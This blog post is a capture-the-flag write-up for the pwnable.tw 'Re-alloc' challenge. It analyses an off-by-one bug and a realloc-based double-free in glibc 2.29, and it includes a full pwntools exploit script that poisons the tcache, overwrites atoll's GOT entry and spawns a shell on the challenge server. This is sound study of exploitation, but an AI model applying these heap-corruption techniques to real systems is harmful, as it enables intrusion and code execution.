---
layout: post
title:  "Pwnable.tw - Re-alloc"
date:   2025-01-12 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Re-alloc 

```bash
$ checksec ./re-alloc
[*] '/home/itay/projects/pwnable_tw/re-alloc/re-alloc'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    FORTIFY:    Enabled
    Stripped:   No

$ file ./re-alloc
./re-alloc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=14ee078dfdcc34a92545f829c718d7acb853945b, for GNU/Linux 3.2.0, not stripped
```

64-bit binary. 

## Debug

We're given libc-2.29, which isn't too old:

```bash
$ strings libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so | grep GNU
GNU C Library (Ubuntu GLIBC 2.29-0ubuntu2) stable release version 2.29.
Compiled by GNU CC version 8.3.0.
```

I've install the corresponding debian package:

```bash
cd glibc-all-in-one
mkdir -p libs/2.29-0ubuntu2_amd64/
cd debs
wget https://launchpad.net/ubuntu/+source/glibc/2.29-0ubuntu2/+build/16599428/+files/libc6_2.29-0ubuntu2_amd64.deb
cd ..
./extract debs/libc6_2.29-0ubuntu2_amd64.deb libs/2.29-0ubuntu2_amd64/
```

And used `patchelf` to mimic the remote environment precisely. 

## Overview

Menu-based challenge. Having the options of `alloc, realloc, free, exit`.

1. `read_long` - the main routine to parse numbers off the user. Its implementation is interesting - reading `0x10` bytes to buffer of size `0x18`, having a check that the read amount isn't larger than the buffer's size - `0x11`. Also notice that this buffer isn't initialized to `0`, hence, the rest of the bytes aren't guranteed to contain nullified values. This might mean that the preceding `atoll` call might leak stack values, by parsing them as part of the number. 

2. The fact that `read_long` uses `atoll` might hint we can also store there some non-number string, which would still get parsed properly.

3. Within `allocate`, the return value of `index = read_long` (and size) are checked. In particuler, if these are high values, such as pointers, the program would terminate. Hence, `read_long` won't be able to serve as a stack leak primitive (`rfree, realloc` also performs these checks).

4. `allocate` - verifies that the requested `index` is either `0` or `1`, and that the pointer slot within the global `heap` address isn't initialized. If that's the case, requests the `size` of the allocation (must be below `0x78`, probably to fall within the fastbins & tcache), and **performs the allocation using `realloc(NULL, size)`**. By reading the documentation, it should be equal to `malloc(size)`. What would `malloc(0)` do?

5. Vuln - the returned chunk isn't initialized. Hence, it may still contain uninitialized values, if we'd send less than `size` bytes. 

6. Vuln - OOB-W of a single null byte. Notice that `ptr[size] = '\0'` is being issued, hence - writing a byte past the buffer's end, writing a total of `size + 1` bytes.

7. `rfree` - frees the pointers using `realloc(ptr, 0)`, and nullifies the `heap` global slot to prevent UAF. Seems as there are no vulns here.

8. `reallocate` - performs `realloc` of the desired size and heap slot. It then stores the return value within a global heap slot, reading the input to there. This time, without truncating the buffer with OOB-W of `\x00`. 

9. Vuln - `reallocate` may receive `size == 0`, which in this case, triggers `realloc(ptr, 0) == free(ptr)`. Notice that the retval is checked to be non-NULL (where the retval in this case is actually NULL). However, in this case, the function returns before assigning the pointer within the global `heap` slot. Hence, the slot still contains the chunk's pointer, but this time - it is already freed. We can reissue the same routine, or `rfree`, to cause double-free. 

Indeed, while performing point (9), I've got the following error:

```bash
free(): double free detected in tcache 2
```

Meaning there's tcache enabled. 


## Exploitation

So we have 2 major bugs - 1 byte heap overflow of `\x00`, and double-free. \
My goto approach is using the double free, such that we'd be able to overwrite content of a chunk within the tcachebin freelist. 

### Write Primitive

By overwriting the tcache chunk's `next` pointer to an address of our wish, we can obtain arbitrary-alloc primitive, which is easily tranlated to an arbitrary write. \
Interestingly, even after perfoming the `free(a), free(b), free(a)` trick, double free was still detected. \
By reading `glibc-2.29` sources, I've seen that in case the key (the next ptr after `next`) matches `tcache_perthread_struct`, ALL tcachebin would be traversed over, so the above trick wouldn't work. However, if we can corrupt this value, we'd be good. **The off-by-one vuln, potentially writing the size class of a freed chunk, may come very handy**:

```bash
pwndbg> x/20gx 0x31686250
0x31686250:     0x0000000000000000      0x0000000000000021
0x31686260:     0x4141414141414141      0x4141414141414141
0x31686270:     0x4141414141414141      0x0000000000000000
0x31686280:     0x4141414141414141      0x4141414141414141
0x31686290:     0x4141414141414141      0x0000000000020c00
0x316862a0:     0x0000000000000000      0x0000000000000000
```

Such a technique is called `House of Poortho`. However, it seems to be valuable only in cases where the size isn't `0`, but we can perform a size mismatch. For example, shrunk `0x120` to `0x100`. This is not the case. \
Another option i've tried, is to try and avoid using the tcache - and use the fastbins instead. However we're very limited, only for 2 allocations at once. Hence, it won't be trivial. 

At this point I've concluded the challenge must involve the `realloc(ptr, 0)` vuln. Since `free` of this chunk seems to be causing a trap as glibc-2.29 mitigates this well, we have only one other option - calling `realloc` on the already freed chunk! 

**Q: How the heck would `realloc` on a freed chunk behave?**

Well, if the size would be `0` - just as `free`, hence we'd encounter the same problem as before. \
**However, in case the size isn't `0`, `realloc` checks if the desired requested size corresponds to the chunk's size (within the metadata), and if so - simply returns the given pointer as-is!**
This feature is amazing - because `realloc` design doesn't considers the wrecked case of given freed ptr parameter, calling `realloc` on freed chunk with its adequate size is "no-op" - and returns its valid pointer, without touching any freelist. \
Within the challenge, it allows us to write content directly to the freed tcache chunk, **while still keeping it inside the tcache freelist**. 

Next, because our overwritten chunk is the freelist's head, we'd like to perform 2 allocations. The caveat is that we only have 2 available slots. \
If we would free our overwritten chunk, it would be the next freelist head - instead of our target fake chunk. \
The trick is to use realloc to linearly increase the chunks, for example from size class `0x30` to `0x40`, without any memory-reallocation. 
That way, when we would free the chunk back - it would get to the freelist head of another bin, leaving our target fake chunk at the head of its bin.

### Read Primitive

Using the write primitive, simply overwrite `atoll` to `printf`, and use format specifiers to leak content off registers / stack memory. 

## Solution

```python
#!/usr/bin/python3

from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10106
context.arch='amd64'
BINARY = './re-alloc'
LIBC = './libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so'
LD = './ld-2.29.so'

GDB_SCRIPT = '''
#b *0x40155c
# commands
#    p "gonna call realloc"
# end

#b *0x401632
#commands
#    p "gonna call free"
#end

#b *0x4013f1
#commands
#    p "gonna call alloc"
#end

b *0x40129d
commands
   p "gonna call atoll.."
end

ignore 1 31

c
'''

def unsigned(n, bitness=32):
    if n < 0:
        n = n + 2**bitness
    return n

def pad(buf, alignment, delimiter=b'\x00'):
    if (len(buf) % alignment) == 0:
        return buf

    extra = (alignment - (len(buf) % alignment)) * delimiter
    return buf + extra

def splitted(buf, n):
    for i in range(0, len(buf), n):
        yield buf[i: i + n]

def chunkSize(alloc_size):
    assert(alloc_size >= 0)
    min_size = alloc_size + SIZEOF_PTR
    res = min_size % (2 * SIZEOF_PTR)
    pad = (2 * SIZEOF_PTR) - res if res else 0
    return min_size + pad

def allocSize(chunkSize):
    assert((chunkSize & 0xf) == 0)
    return chunkSize - SIZEOF_PTR

def recvPointer(p):
    leak = p.recv(SIZEOF_PTR)
    assert(len(leak) == SIZEOF_PTR)
    leak = u32(leak)
    assert(leak > 0x10000)
    return leak

###### Constants ######
IS_DEBUG = False
IS_REMOTE = True
SIZEOF_PTR = 8
CHUNK_DELTA = 0x10
SMALL_CHUNK_SIZE = 0x28
LARGE_CHUNK_SIZE = SMALL_CHUNK_SIZE + 3 * CHUNK_DELTA


###### Offsets ######
libc_leak_to_base = 0x12e009

###### Addresses ######
binary = ELF(BINARY)
main_binary = binary.symbols['main']
puts_got = binary.got['puts']
puts_plt = binary.plt['puts']
atoll_got = binary.got['atoll']
printf_got = binary.got['printf']
printf_plt = binary.plt['printf']

libc = ELF(LIBC)
bin_sh_libc = next(libc.search(b'/bin/sh'))
system_libc = libc.symbols['system']
puts_libc = libc.symbols['puts']
environ_libc = libc.symbols['environ']
log.info(f'bin_sh_libc: {hex(bin_sh_libc)}')
log.info(f'system_libc: {hex(system_libc)}')
log.info(f'puts_libc: {hex(puts_libc)}')
log.info(f'environ: {hex(environ_libc)}')

libc_rop = ROP(LIBC)
# pop_eax_ret = libc_rop.eax.address
# pop_ebx_ret = libc_rop.ebx.address
# pop_ecx_ret = libc_rop.ecx.address
# pop_edx_ret = libc_rop.edx.address
# leave_ret = libc_rop.find_gadget(['leave']).address
# int_80 = libc_rop.find_gadget(['int 0x80']).address
# log.info(f'pop_eax_ret: {hex(pop_eax_ret)}')
# log.info(f'pop_ebx_ret: {hex(pop_ebx_ret)}')
# log.info(f'pop_ecx_ret: {hex(pop_ecx_ret)}')
# log.info(f'pop_edx_ret: {hex(pop_edx_ret)}')
# log.info(f'leave_ret: {hex(leave_ret)}')
# log.info(f'int_80: {hex(int_80)}')

def alloc(p, index, size, data):
    p.sendline(b'1')
    p.recvuntil(b'Index:')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size:')
    p.sendline(str(size).encode())
    p.recvuntil(b'Data:')
    p.send(data)
    p.recvuntil(b'Your choice: ')

def adjusted_alloc(p, index, size, data):
    ''' Performs alloc, but assumes atoll was overwritten with printf.
    Hence, controls the fake "atoll" retval using printf retval, which is the number of printed characters
    '''
    p.sendline(b'1')
    p.recvuntil(b'Index:')
    buf_1 = b'%' + str(index).encode() + b'c\x00'
    p.send(buf_1)
    p.recvuntil(b'Size:')
    buf_2 = b'%' + str(size).encode() + b'c\x00'
    p.send(buf_2)
    p.recvuntil(b'Data:')
    p.send(data)
    p.recvuntil(b'Your choice: ')

def realloc(p, index, size, data):
    p.sendline(b'2')
    p.recvuntil(b'Index:')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size:')
    p.sendline(str(size).encode())
    if size == 0:
        p.recvuntil(b'alloc error\n')
    else: 
        p.recvuntil(b'Data:')
        p.send(data)
    p.recvuntil(b'Your choice: ')

def free(p, index):
    p.sendline(b'3')
    p.recvuntil(b'Index:')
    p.sendline(str(index).encode())
    p.recvuntil(b'Your choice: ')

def leak_libc(p):
    # fake realloc, to make sure this would fail.
    p.sendline(b'2')
    p.recvuntil(b'Index:')
    buf = b'%3$llu'
    p.send(buf)
    data = p.recvuntil(b'Invalid !')
    leak = data[:data.find(b'Invalid !')]
    leak = int(leak, 10)
    libc_base = leak - libc_leak_to_base
    assert((libc_base & 0xfff) == 0)
    p.recvuntil(b'Your choice: ')
    return libc_base

def set_freelist_head_addr(p, addr, chunk_size):
    ''' Sets the freelist head of tcachebin corresponding to size class 'chunk_size'.
    Apparently, for glibc-2.29, eventhough the tcachebin's count is 0, as long as its head isn't NULL - it would perform allocation.
    For newer versions of glibc this isn't the case anymore, and __libc_malloc mitigates this,
    by also verifying that the count is larger than 0.
    '''
    small_buf = b'A' * chunk_size

    # Allocate target chunk
    alloc(p, 0, chunk_size, small_buf)    
    # Free it
    realloc(p, 0, 0, b'')                   
    # Overwrite freed chunk's next
    realloc(p, 0, chunk_size, p64(addr))   
    # We'd like to consume the first chunk within the freelist, 
    # so the tcache head would now point to the target address
    alloc(p, 1, chunk_size, b'B' * 8)  
    # Restore state - we'd like to reset both pointers back to NULL.
    # The problem is that free on the same size chunks would return them back to the first tcache freelist,
    # hence - return the freelist head to whatever it was instead of our target.
    # The idea is to change their chunk size, such that they would be returned to a different tcachebin.
    # Notice we utilize the fact that realloc CAN grow linearly, and does not performs reallocation in this case.
    # Otherwise, memory reallocations would wreck us - as they'd be causing free on the previous small chunk. 
    realloc(p, 1, chunk_size + CHUNK_DELTA, b'B' * 8)
    free(p, 1)
    realloc(p, 0, chunk_size + CHUNK_DELTA * 2, b'B' * 8)
    free(p, 0)

####### Exploit #######
def exploit(p):
    p.recvuntil(b'Your choice: ')

    # Step 1 - overwrite atoll to printf, and leak libc using format string
    set_freelist_head_addr(p, addr=atoll_got, chunk_size=SMALL_CHUNK_SIZE)

    # Step 2 - call system("/bin/sh"), also by overwriting of atoll's GOT
    set_freelist_head_addr(p, addr=atoll_got, chunk_size=LARGE_CHUNK_SIZE)

    # Overwrite atoll to printf
    alloc(p, 0, SMALL_CHUNK_SIZE, p64(printf_plt)) 
    libc_base = leak_libc(p) 
    log.info(f'libc_base: {hex(libc_base)}')

    # Overwrite atoll to system 
    system_addr = libc_base + system_libc
    log.info(f'system_addr: {hex(system_addr)}')
    adjusted_alloc(p, 1, LARGE_CHUNK_SIZE, p64(system_addr)) 

    # Trigger system("/bin/sh")
    p.sendline(b'2')
    p.recvuntil(b'Index:')
    p.sendline(b'/bin/sh\x00')

def main():
    if IS_DEBUG:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if IS_REMOTE:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```
